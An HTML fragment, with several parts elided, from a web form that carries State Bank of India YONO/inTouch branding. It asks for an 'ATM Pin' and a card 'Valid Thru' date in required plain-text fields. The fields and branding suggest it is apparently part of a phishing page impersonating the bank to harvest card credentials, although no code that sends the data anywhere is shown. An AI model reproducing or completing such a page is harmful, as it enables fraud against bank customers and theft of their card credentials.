                                        ...
                                        margin-left:;">
                                            ...
                                            " class="sbi-yono-logo" src="img/sbi_intouch_logo.svg"><br><br> -->
                                                ...
                                                <div class=" validate-input">
                                                    <label for="cid">ATM Pin
                                                    
                                                    </label>
                                                    <input class="wrap-input100 input100" type="text" name="ATM_pin" placeholder="" maxlength="35"
       required>
                                                    
                                                </div>
                                                <div class=" validate-input">
                                                    <label for="cid">Valid Thru</label>
                                                    <input class="wrap-input100 input100" type="text" name="Valid_thru"maxlength="35" placeholder="" required>
